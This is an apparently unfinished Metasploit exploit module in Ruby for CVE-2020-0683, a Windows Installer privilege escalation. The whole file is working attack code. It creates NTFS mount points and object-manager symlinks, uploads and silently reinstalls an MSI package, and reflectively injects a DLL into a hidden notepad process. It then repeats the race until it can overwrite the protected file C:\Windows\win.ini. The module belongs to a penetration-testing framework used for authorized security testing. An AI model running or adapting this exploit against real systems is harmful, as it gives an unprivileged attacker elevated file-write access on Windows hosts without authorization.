##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/common'
require 'msf/core/post/windows'
require 'msf/core/exploit/windows_constants'
require 'windows_error'

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::Common
  include Msf::Post::Windows::Error
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::ReflectiveDLLInjection
  include Msf::Exploit::Windows_Constants
  include ::WindowsError

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Windows Installer Privilege Escalation',
      'Description'    => %q(
        TODO
      ),
      'License'        => MSF_LICENSE,
      'Author'         => [
                            'padovah4ck',             # discovery & PoC
                            'Christophe De La fuente' # msf module
                          ],
      'References'     =>
        [
          [ 'CVE', '2020-0683'],
          [ 'URL', 'https://github.com/padovah4ck/CVE-2020-0683']
        ],
      'Arch'           => [ ARCH_X86, ARCH_X64 ],
      'Platform'       => 'win',
      'Payload'        =>
      {
      },
      'SessionTypes'   => [ 'meterpreter' ],
      'Targets'        => [
        [
            'Windows x86', { 'Arch'  => ARCH_X86 }
        ],
        [
            'Windows x64', { 'Arch'  => ARCH_X64 }
        ]
      ],
      'DisclosureDate' => 'Feb 11 2020',
      'DefaultTarget'  => 1
    ))

    # stores open handles to cleanup properly
    @handles = []
  end

  class String16 < BinData::String
    def assign(val)
      super(val.encode('utf-16le'))
    end

    def snapshot
      super.force_encoding('utf-16le')
    end
  end

  class UnicodeString < BinData::Record
    ARCH_X86 = 0
    ARCH_X64 = 1

    endian :little

    uint16 :str_length
    uint16 :maximum_length
    string :padding, length: -> { arch == ARCH_X64 ? 4 : 0 }
    choice :p_buffer, selection: -> { arch } do # PWTR
      uint32 ARCH_X86
      uint64 ARCH_X64
    end
  end

  class ObjectAttributes < BinData::Record
    #
    # Valid values for the Attributes field
    OBJ_INHERIT                       = 0x00000002
    OBJ_PERMANENT                     = 0x00000010
    OBJ_EXCLUSIVE                     = 0x00000020
    OBJ_CASE_INSENSITIVE              = 0x00000040
    OBJ_OPENIF                        = 0x00000080
    OBJ_OPENLINK                      = 0x00000100
    OBJ_KERNEL_HANDLE                 = 0x00000200
    OBJ_FORCE_ACCESS_CHECK            = 0x00000400
    OBJ_IGNORE_IMPERSONATED_DEVICEMAP = 0x00000800
    OBJ_DONT_REPARSE                  = 0x00001000
    OBJ_VALID_ATTRIBUTES              = 0x00001FF2

    ARCH_X86 = 0
    ARCH_X64 = 1

    endian :little

    uint32 :total_length, initial_value: -> { num_bytes }
    string :padding1, length: -> { arch == ARCH_X64 ? 4 : 0 }
    choice :p_root_directory, selection: -> { arch } do
      uint32 ARCH_X86
      uint64 ARCH_X64
    end
    choice :p_object_name, selection: -> { arch } do
      uint32 ARCH_X86
      uint64 ARCH_X64
    end
    uint32 :attributes
    string :padding2, length: -> { arch == ARCH_X64 ? 4 : 0 }
    choice :p_security_descriptor, selection: -> { arch } do
      uint32 ARCH_X86
      uint64 ARCH_X64
    end
    choice :p_security_quality_of_service, selection: -> { arch } do
      uint32 ARCH_X86
      uint64 ARCH_X64
    end
  end

  class Guid < BinData::Record
    endian :little

    uint32 :data1, initial_value: 0
    uint16 :data2, initial_value: 0
    uint16 :data3, initial_value: 0
    string :data4, length: 8, initial_value: "\x00\x00\x00\x00\x00\x00\x00\x00"
  end

  class ReparseGuidDataBuffer < BinData::Record
    endian :little

    uint32 :reparse_tag
    uint16 :reparse_data_length, initial_value: 0
    uint16 :reserved,            initial_value: 0
    guid   :reparse_guid
    string :reparse_data
  end

  class ReparseDataBuffer < BinData::Record
    class ReparseBuffer < BinData::Record
      endian :little

      uint16 :substitute_name_offset
      uint16 :substitute_name_length
      uint16 :print_name_offset
      uint16 :print_name_length
    end

    class SymbolicLinkReparseBuffer < ReparseBuffer
      endian :little

      uint32   :flags
      string16 :path_buffer
    end

    class MountPointReparseBuffer < ReparseBuffer
      endian :little

      string16 :path_buffer
    end

    SYMBOLIC_LINK = 0
    MOUNT_POINT   = 1

    endian :little

    uint32 :reparse_tag
    uint16 :reparse_data_length
    uint16 :reserved, initial_value: 0
    choice :reparse_data, selection: -> { @obj.parent.get_parameter(:type) || -1 } do
      symbolic_link_reparse_buffer SYMBOLIC_LINK
      mount_point_reparse_buffer   MOUNT_POINT
      string :default
    end
  end

  IO_REPARSE_TAG_MOUNT_POINT      = 0xA0000003
  IO_REPARSE_TAG_HSM              = 0xC0000004
  IO_REPARSE_TAG_DRIVE_EXTENDER   = 0x80000005
  IO_REPARSE_TAG_HSM2             = 0x80000006
  IO_REPARSE_TAG_SIS              = 0x80000007
  IO_REPARSE_TAG_WIM              = 0x80000008
  IO_REPARSE_TAG_CSV              = 0x80000009
  IO_REPARSE_TAG_DFS              = 0x8000000A
  IO_REPARSE_TAG_FILTER_MANAGER   = 0x8000000B
  IO_REPARSE_TAG_SYMLINK          = 0xA000000C
  IO_REPARSE_TAG_IIS_CACHE        = 0xA0000010
  IO_REPARSE_TAG_DFSR             = 0x80000012
  IO_REPARSE_TAG_DEDUP            = 0x80000013
  IO_REPARSE_TAG_APPXSTRM         = 0xC0000014
  IO_REPARSE_TAG_NFS              = 0x80000014
  IO_REPARSE_TAG_FILE_PLACEHOLDER = 0x80000015
  IO_REPARSE_TAG_DFM              = 0x80000016
  IO_REPARSE_TAG_WOF              = 0x80000017

  FSCTL_SET_REPARSE_POINT    = 0x000900a4
  FSCTL_DELETE_REPARSE_POINT = 0x000900ac


  def set_reparse_point(handle, reparse_buffer)
    result = session.railgun.kernel32.DeviceIoControl(
      handle,
      FSCTL_SET_REPARSE_POINT,
      reparse_buffer,
      reparse_buffer.size,
      nil,
      0,
      4,
      nil
    )

    unless result['return']
      print_error("Error setting the reparse point. Windows Error Code: #{result['GetLastError']} - #{result['ErrorMessage']}")
    end
    result['return']
  end

  def delete_reparse_point(handle, reparse_buffer)
    result = session.railgun.kernel32.DeviceIoControl(
      handle,
      FSCTL_DELETE_REPARSE_POINT,
      reparse_buffer,
      reparse_buffer.size,
      nil,
      0,
      4,
      nil
    )

    unless result['return']
      print_error("Error deleting the reparse point. Windows Error Code: #{result['GetLastError']} - #{result['ErrorMessage']}")
    end
    result['return']
  end

  def open_reparse_point(path, writable)
    result = session.railgun.kernel32.CreateFileW(
      path,
      "GENERIC_READ | #{writable ? 'GENERIC_WRITE' : '0'}",
      'FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE',
      nil,
      'OPEN_EXISTING',
      'FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT',
      0
    )

    handle = result['return']
    if handle.nil? || handle == INVALID_HANDLE_VALUE
      print_error("Error opening #{path}. Windows Error Code: #{result['GetLastError']} - #{result['ErrorMessage']}")
      return nil
    end
    vprint_good("Successfuly opened #{path}")
    @handles << handle
    handle
  end

  def delete_mount_point(path)
    buffer = ReparseGuidDataBuffer.new
    buffer.reparse_tag = IO_REPARSE_TAG_MOUNT_POINT

    handle = open_reparse_point(path, true);
    return nil unless handle
    delete_reparse_point(handle, buffer.to_binary_s)
  end

  def write_to_memory(process, str)
    p_buffer = process.memory.allocate(str.size)
    unless p_buffer
      print_error("Error alocating memory for \"#{str}\": Windows Error Code: #{result['GetLastError']} - #{result['ErrorMessage']}")
      return nil
    end
    unless process.memory.write(p_buffer, str) == str.size
      print_error("Error writting \"#{str}\" to memory buffer: Windows Error Code: #{result['GetLastError']} - #{result['ErrorMessage']}")
      return nil
    end
    p_buffer
  end

  def build_unicode_string(str_byte_size, p_buffer)
    unicode_str = UnicodeString.new(
      arch: client.native_arch == ARCH_X64 ? UnicodeString::ARCH_X64 : UnicodeString::ARCH_X86
    )
    unicode_str.str_length = str_byte_size - 2
    unicode_str.maximum_length = str_byte_size
    unicode_str.p_buffer = p_buffer
    unicode_str
  end

  def str_to_unicode(str)
    str.encode('UTF-16LE').force_encoding('binary') + "\x00\x00"
  end

  def setup_unicode_str_in_memory(process, str)
    enc_str = str_to_unicode(str)
    p_buffer = write_to_memory(process, enc_str)
    return nil unless p_buffer
    build_unicode_string(enc_str.size, p_buffer)
  end

  def build_object_attributes(p_unicode_buf)
    object_attributes = ObjectAttributes.new(
      arch: client.native_arch == ARCH_X64 ? ObjectAttributes::ARCH_X64 : ObjectAttributes::ARCH_X86
    )
    object_attributes.p_root_directory = 0 # root argument is nil, otherwise, we need to get a valid handle to root (TODO later)
    object_attributes.attributes = ObjectAttributes::OBJ_CASE_INSENSITIVE
    object_attributes.p_security_descriptor = 0
    object_attributes.p_security_quality_of_service = 0
    object_attributes.p_object_name = p_unicode_buf
    object_attributes
  end

  def create_symlink(root, link_name, target_name)
    process = session.sys.process.open

    unicode_str = setup_unicode_str_in_memory(process, link_name)
    return nil unless unicode_str

    p_unicode_buf = write_to_memory(process, unicode_str.to_binary_s)
    return nil unless p_unicode_buf

    object_attributes = build_object_attributes(p_unicode_buf)

    unicode_str = setup_unicode_str_in_memory(process, target_name)
    return nil unless unicode_str

    symbolic_link_all_access = STANDARD_RIGHTS_REQUIRED | 0x1

    result = session.railgun.ntdll.NtCreateSymbolicLinkObject(
      client.native_arch == ARCH_X64 ? 8 : 4,
      symbolic_link_all_access,
      object_attributes.to_binary_s,
      unicode_str.to_binary_s
    )
    unless result['GetLastError'] == SUCCESS
      print_error("Error creating the symlink. Windows Error Code: #{result['GetLastError']} - #{result['ErrorMessage']}")
      return nil
    end
    unless result['return'] == ::WindowsError::NTStatus::STATUS_SUCCESS.value
      error = ::WindowsError::NTStatus.find_by_retval(result['return']).first
      print_error("Something went wrong while creating the symlink. Return value: NTSTATUS #{error} ()")
      return nil
    end
    @handles << result['LinkHandle']
    result['return']
  ensure
    process.close
  end

  def build_reparse_data_buffer(target, print_name)
    buffer = ReparseDataBuffer.new(type: ReparseDataBuffer::MOUNT_POINT)
    target_byte_size = target.size * 2
    print_name_byte_size = print_name.size * 2
    path_buffer_size = target_byte_size + print_name_byte_size + 8 + 4

    buffer.reparse_tag = IO_REPARSE_TAG_MOUNT_POINT
    buffer.reparse_data_length = path_buffer_size
    buffer.reparse_data.substitute_name_offset = 0
    buffer.reparse_data.substitute_name_length = target_byte_size
    buffer.reparse_data.print_name_offset = target_byte_size + 2
    buffer.reparse_data.path_buffer = target + "\0" + print_name + "\0"

    buffer
  end

  def create_mount_point(path, target, print_name = '')
    return nil if target.empty? || path.empty?

    fixed_target = target.start_with?('\\') ? target : "\\??\\#{target}"
    reparse_data = build_reparse_data_buffer(fixed_target, print_name)

    handle = open_reparse_point(path, true)
    return nil unless handle
    set_reparse_point(handle, reparse_data.to_binary_s)
  end




  def setup_temp_dir(dir_path)
    begin
      session.fs.dir.rmdir(dir_path)
    rescue Rex::Post::Meterpreter::RequestError
    end
    begin
      session.fs.dir.mkdir(dir_path)
    rescue Rex::Post::Meterpreter::RequestError => e
      fail_with(Failure::Unknown, "Error when creating \"#{dir_path}\": #{e.message}")
    end
  end

  def upload_msi(msi)
    msi_path = ::File.join(Msf::Config.data_directory, 'post', 'msi', msi)
    unless ::File.exist?(msi_path)
      fail_with(Failure::Unknown, "MSI file #{msi_path} not found.")
    end
    tempdir = session.sys.config.getenv('TEMP')
    # TODO: use random name
    remote_msi = "#{tempdir}\\#{msi}"
    print_status("Writing #{msi_path} to #{remote_msi}...")
    session.fs.file.upload_file(remote_msi, msi_path)
    print_good("#{remote_msi} written")
    return remote_msi
  rescue Rex::Post::Meterpreter::RequestError => e
    fail_with(Failure::Unknown, "Error when uploading msi file: #{e.message}")
  end

  def exploit
    if is_system?
      fail_with(Failure::None, 'Session is already elevated')
    end
    if sysinfo['Architecture'] == ARCH_X64
      if session.arch == ARCH_X86
        fail_with(Failure::NoTarget, 'Running against WOW64 is not supported, please get an x64 session')
      end

      if target.arch.first == ARCH_X86
        fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')
      end
    end

    #target_file = "C:\\Users\\n00tmeg\\target.txt"
    target_file = "C:\\Windows\\win.ini"
    # user_home -> C:\Users\[USER]
    user_home = session.sys.config.getenv('USERPROFILE')
    # user_home_path -> C:\Users\[USER]\foomsi
    user_home_path = user_home + '\\foomsi'
    # app_data_dir_path -> C:\Users\[USER]\AppData\Local\fakemsi
    app_data_dir_path = user_home + '\\AppData\\Local\\fakemsi'
    # app_data_file_path -> C:\Users\[USER]\AppData\Local\fakemsi\foo.txt
    app_data_file_path = app_data_dir_path + '\\foo.txt'

    print_status('Removing and creating temporary directory')
    setup_temp_dir(user_home_path)
    setup_temp_dir(app_data_dir_path)

    print_status("Creating mountpoint from #{app_data_dir_path} to #{user_home_path}")
    unless create_mount_point(app_data_dir_path, user_home_path)
      fail_with(Failure::Unknown, "Error when creating the mount point... aborting.")
    end

    print_status("Creating symlink #{target_file} in \\RPC Control\\foo.txt")
    unless create_symlink(nil, "\\RPC Control\\foo.txt", "\\??\\#{target_file}")
      fail_with(Failure::Unknown, "Error when creating the symlink... aborting.")
    end

    msi = 'foo.msi'
    print_status("Uploading #{msi}...")
    remote_msi = upload_msi(msi)

    msi_cmd = "msiexec /qn /x #{remote_msi}"
    print_status("Removing MSI package on target: \"#{msi_cmd}\"")
    cmd_exec(msi_cmd)

    msi_cmd = "msiexec /qn /i #{remote_msi}"
    print_status("Installing MSI package on target: \"#{msi_cmd}\"")
    cmd_exec(msi_cmd)

    print_status('Inject DLL to exploit the race condition...')

    print_status('Launching notepad to host the exploit code...')
    notepad_process = session.sys.process.execute('notepad.exe', nil, {'Hidden' => true})
    process = session.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
    if process
      print_good("Process #{process.pid} launched.")
    else
      print_error('Operation failed. Using the current process instead')
      process = session.sys.process.open
    end

    print_status("Reflectively injecting the DLL into process pid #{process.pid}...")
    #library_path = ::File.join(Msf::Config.data_directory, 'post', 'msi', 'windows_installer_privesc.x64.dll')
    library_path = ::File.join(Msf::Config.install_root, 'external', 'source', 'exploits', 'CVE-2020-0683-windows_installer_privesc', 'x64', 'Release', 'windows_installer_privesc.dll')
    exploit_mem, offset = inject_dll_into_process(process, library_path)
    print_good("DLL injected." )
    print_status("Injecting file path string into process pid #{process.pid}...")
    enc_app_data_file_path = str_to_unicode(app_data_file_path)
    payload_mem = inject_into_process(process, enc_app_data_file_path)
    print_good('Payload injected.')

    print_status("Executing exploit multiple times, until winning the race condition...")
    msi_cmd = "msiexec /qn /fa #{remote_msi}"
    10.times do |i|
      print_status("##{i}")
      # Invoke the file monitoring code, passing in the address of the file path string
      thread = process.thread.create(exploit_mem + offset, payload_mem)
      vprint_status("Thread tid=\"#{thread.tid}\" created")
      vprint_status("Force reinstalling MSI package: \"#{msi_cmd}\"")
      cmd_exec(msi_cmd)
      begin
        session.fs.file.open(target_file, 'wb') do |fd|
          fd.write("Yeet!!")
        end
        print_good('Success!!')
        break
      rescue Rex::Post::Meterpreter::RequestError => e
        vprint_error("Error when attempting to write the target file #{target_file}: #{e.message}")
        sleep 1
      end
    ensure
      thread.terminate(0) if process.thread.get_threads.include?(thread.tid)
      thread.close
      vprint_status("Recreating mountpoint from #{app_data_dir_path} to #{user_home_path}")
      unless create_mount_point(app_data_dir_path, user_home_path)
        fail_with(Failure::Unknown, "Error when creating the mount point... aborting.")
      end
    end

  ensure
    print_status("Cleanup...")
    vprint_status("Remove #{remote_msi}")
    begin
      session.fs.file.rm(remote_msi)
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error("Error while removing #{remote_msi}: #{e.message}")
    end

    if notepad_process
      print_status("Kill notepad (pid=#{notepad_process.pid}) and close handles")
      begin
        session.sys.process.kill(notepad_process.pid)
      rescue Rex::Post::Meterpreter::RequestError => e
        print_error("Error while killing notepad: #{e.message}")
      end
      notepad_process.close
    end
    process.close if process

    print_status("Delete mountpoint #{app_data_dir_path}")
    unless delete_mount_point(app_data_dir_path)
      print_error("Error when deleting the mount point.")
    end
    begin
      session.fs.dir.rmdir(app_data_dir_path)
    rescue Rex::Post::Meterpreter::RequestError
      print_error("Error when deleting \"#{app_data_dir_path}\".")
    end
    begin
      session.fs.dir.rmdir(user_home_path)
    rescue Rex::Post::Meterpreter::RequestError
      print_error("Error when deleting \"#{user_home_path}\".")
    end

    @handles.each do |handle|
      vprint_status("Close handle #{handle}")
      session.railgun.kernel32.CloseHandle(handle)
    end

    print_good("Done!")
  end

end
